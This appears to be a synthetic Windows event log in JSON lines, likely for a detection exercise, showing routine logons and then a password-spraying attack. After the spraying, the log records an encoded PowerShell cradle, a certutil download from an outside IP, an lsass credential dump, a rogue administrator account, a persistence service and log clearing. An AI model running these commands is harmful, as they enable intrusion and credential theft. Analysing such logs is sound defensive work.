+{"@timestamp": "2026-10-31T03:12:46Z", "EventID": 4625, "Computer": "DC01", "EventData": {"TargetUserName": "alice", "IpAddress": "10.10.3.10", "LogonType": 2}}
+{"@timestamp": "2026-10-31T03:13:06Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "alice", "IpAddress": "10.10.3.10", "LogonType": 2}}
+{"@timestamp": "2026-10-31T03:33:06Z", "EventID": 4688, "Computer": "WS-ALICE", "EventData": {"SubjectUserName": "alice", "NewProcessName": "C:\\Program Files\\App\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-31T04:02:16Z", "EventID": 4688, "Computer": "WS-ALICE", "EventData": {"SubjectUserName": "alice", "NewProcessName": "C:\\Program Files\\App\\EXCEL.EXE", "CommandLine": "EXCEL.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-31T04:08:22Z", "EventID": 4688, "Computer": "WS-ALICE", "EventData": {"SubjectUserName": "alice", "NewProcessName": "C:\\Program Files\\App\\Teams.exe", "CommandLine": "Teams.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-31T04:30:16Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "ivan", "IpAddress": "10.10.3.18", "LogonType": 2}}
+{"@timestamp": "2026-10-31T04:33:42Z", "EventID": 4688, "Computer": "WS-IVAN", "EventData": {"SubjectUserName": "ivan", "NewProcessName": "C:\\Program Files\\App\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-31T05:17:19Z", "EventID": 4688, "Computer": "WS-IVAN", "EventData": {"SubjectUserName": "ivan", "NewProcessName": "C:\\Program Files\\App\\chrome.exe", "CommandLine": "chrome.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-31T05:25:41Z", "EventID": 4688, "Computer": "WS-IVAN", "EventData": {"SubjectUserName": "ivan", "NewProcessName": "C:\\Program Files\\App\\EXCEL.EXE", "CommandLine": "EXCEL.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-31T11:53:51Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "alice"}}
+{"@timestamp": "2026-10-31T13:01:13Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "ivan"}}
+{"@timestamp": "2026-10-31T19:34:00Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "svc_backup", "IpAddress": "10.10.2.30", "LogonType": 5}}
+{"@timestamp": "2026-10-31T20:14:00Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "svc_backup"}}
+{"@timestamp": "2026-11-01T03:41:37Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "erin", "IpAddress": "10.10.3.14", "LogonType": 2}}
+{"@timestamp": "2026-11-01T03:48:42Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "alice", "IpAddress": "10.10.3.10", "LogonType": 2}}
+{"@timestamp": "2026-11-01T03:52:20Z", "EventID": 4688, "Computer": "WS-ALICE", "EventData": {"SubjectUserName": "alice", "NewProcessName": "C:\\Program Files\\App\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-11-01T03:54:59Z", "EventID": 4688, "Computer": "WS-ERIN", "EventData": {"SubjectUserName": "erin", "NewProcessName": "C:\\Program Files\\App\\Teams.exe", "CommandLine": "Teams.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-11-01T04:19:04Z", "EventID": 4688, "Computer": "WS-ERIN", "EventData": {"SubjectUserName": "erin", "NewProcessName": "C:\\Program Files\\App\\code.exe", "CommandLine": "code.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-11-01T04:22:51Z", "EventID": 4688, "Computer": "WS-ALICE", "EventData": {"SubjectUserName": "alice", "NewProcessName": "C:\\Program Files\\App\\explorer.exe", "CommandLine": "explorer.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-11-01T04:28:42Z", "EventID": 4688, "Computer": "WS-ALICE", "EventData": {"SubjectUserName": "alice", "NewProcessName": "C:\\Program Files\\App\\Teams.exe", "CommandLine": "Teams.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-11-01T04:30:10Z", "EventID": 4688, "Computer": "WS-ERIN", "EventData": {"SubjectUserName": "erin", "NewProcessName": "C:\\Program Files\\App\\explorer.exe", "CommandLine": "explorer.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-11-01T10:42:37Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "erin"}}
+{"@timestamp": "2026-11-01T11:18:40Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "alice"}}
+{"@timestamp": "2026-11-01T21:01:15Z", "EventID": 4625, "Computer": "DC01", "EventData": {"TargetUserName": "alice", "IpAddress": "10.10.9.99", "LogonType": 3}}
+{"@timestamp": "2026-11-01T21:01:19Z", "EventID": 4625, "Computer": "DC01", "EventData": {"TargetUserName": "bob", "IpAddress": "10.10.9.99", "LogonType": 3}}
+{"@timestamp": "2026-11-01T21:01:25Z", "EventID": 4625, "Computer": "DC01", "EventData": {"TargetUserName": "carol", "IpAddress": "10.10.9.99", "LogonType": 3}}
+{"@timestamp": "2026-11-01T21:01:29Z", "EventID": 4625, "Computer": "DC01", "EventData": {"TargetUserName": "dave", "IpAddress": "10.10.9.99", "LogonType": 3}}
+{"@timestamp": "2026-11-01T21:01:36Z", "EventID": 4625, "Computer": "DC01", "EventData": {"TargetUserName": "dave", "IpAddress": "10.10.9.99", "LogonType": 3}}
+{"@timestamp": "2026-11-01T21:01:42Z", "EventID": 4625, "Computer": "DC01", "EventData": {"TargetUserName": "erin", "IpAddress": "10.10.9.99", "LogonType": 3}}
+{"@timestamp": "2026-11-01T21:01:46Z", "EventID": 4625, "Computer": "DC01", "EventData": {"TargetUserName": "frank", "IpAddress": "10.10.9.99", "LogonType": 3}}
+{"@timestamp": "2026-11-01T21:01:50Z", "EventID": 4625, "Computer": "DC01", "EventData": {"TargetUserName": "grace", "IpAddress": "10.10.9.99", "LogonType": 3}}
+{"@timestamp": "2026-11-01T21:01:55Z", "EventID": 4625, "Computer": "DC01", "EventData": {"TargetUserName": "grace", "IpAddress": "10.10.9.99", "LogonType": 3}}
+{"@timestamp": "2026-11-01T21:01:59Z", "EventID": 4625, "Computer": "DC01", "EventData": {"TargetUserName": "heidi", "IpAddress": "10.10.9.99", "LogonType": 3}}
+{"@timestamp": "2026-11-01T21:02:01Z", "EventID": 4625, "Computer": "DC01", "EventData": {"TargetUserName": "ivan", "IpAddress": "10.10.9.99", "LogonType": 3}}
+{"@timestamp": "2026-11-01T21:02:07Z", "EventID": 4625, "Computer": "DC01", "EventData": {"TargetUserName": "judy", "IpAddress": "10.10.9.99", "LogonType": 3}}
+{"@timestamp": "2026-11-01T21:02:11Z", "EventID": 4625, "Computer": "DC01", "EventData": {"TargetUserName": "judy", "IpAddress": "10.10.9.99", "LogonType": 3}}
+{"@timestamp": "2026-11-01T21:02:17Z", "EventID": 4625, "Computer": "DC01", "EventData": {"TargetUserName": "mallory", "IpAddress": "10.10.9.99", "LogonType": 3}}
+{"@timestamp": "2026-11-01T21:02:24Z", "EventID": 4625, "Computer": "DC01", "EventData": {"TargetUserName": "svc_backup", "IpAddress": "10.10.9.99", "LogonType": 3}}
+{"@timestamp": "2026-11-01T21:02:28Z", "EventID": 4625, "Computer": "DC01", "EventData": {"TargetUserName": "svc_backup", "IpAddress": "10.10.9.99", "LogonType": 3}}
+{"@timestamp": "2026-11-01T21:02:35Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "svc_backup", "IpAddress": "10.10.9.99", "LogonType": 3}}
+{"@timestamp": "2026-11-01T21:03:35Z", "EventID": 4688, "Computer": "DC01", "EventData": {"SubjectUserName": "svc_backup", "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA", "ParentProcessName": "C:\\Windows\\System32\\wmiprvse.exe"}}
+{"@timestamp": "2026-11-01T21:05:25Z", "EventID": 4688, "Computer": "DC01", "EventData": {"SubjectUserName": "svc_backup", "NewProcessName": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -urlcache -split -f http://45.33.12.7/p.exe C:\\Users\\Public\\p.exe"}}
+{"@timestamp": "2026-11-01T21:06:32Z", "EventID": 4688, "Computer": "DC01", "EventData": {"SubjectUserName": "svc_backup", "NewProcessName": "C:\\Users\\Public\\procdump64.exe", "CommandLine": "procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\l.dmp"}}
+{"@timestamp": "2026-11-01T21:07:03Z", "EventID": 4720, "Computer": "DC01", "EventData": {"SubjectUserName": "svc_backup", "TargetUserName": "helpdesk2"}}
+{"@timestamp": "2026-11-01T21:07:36Z", "EventID": 4732, "Computer": "DC01", "EventData": {"SubjectUserName": "svc_backup", "MemberName": "CN=helpdesk2,CN=Users,DC=corp,DC=local", "TargetUserName": "Administrators"}}
+{"@timestamp": "2026-11-01T21:08:38Z", "EventID": 7045, "Computer": "DC01", "EventData": {"SubjectUserName": "svc_backup", "ServiceName": "WinUpdateSvc", "ServiceFileName": "C:\\Users\\Public\\p.exe -k"}}
+{"@timestamp": "2026-11-01T21:10:33Z", "EventID": 1102, "Computer": "DC01", "EventData": {"SubjectUserName": "svc_backup"}}
